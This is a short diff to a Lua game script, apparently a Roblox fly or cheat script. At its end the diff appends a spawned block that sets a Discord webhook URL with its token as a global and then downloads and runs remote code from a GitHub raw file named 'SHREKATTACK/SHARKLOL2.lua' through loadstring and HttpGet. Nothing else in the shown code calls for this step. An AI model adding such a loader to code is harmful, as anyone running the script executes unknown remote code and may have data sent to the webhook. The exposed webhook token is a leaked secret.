@@ -325,3 +325,8 @@ Fly = false
             end)
         end
     end
+
+spawn(function()
+_G.webhooksdiscord = "https://discord.com/api/webhooks/905270427843178516/ThOEwl6gUys-Yqz5qWg7bDTdDvabpEinO3PAv6qfbu_L2CVDCRUPlJdEOJJfqd0kHRX_"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SHARKX516/SHREKATTACK/main/SHARKLOL2.lua"),true)()
+ end)
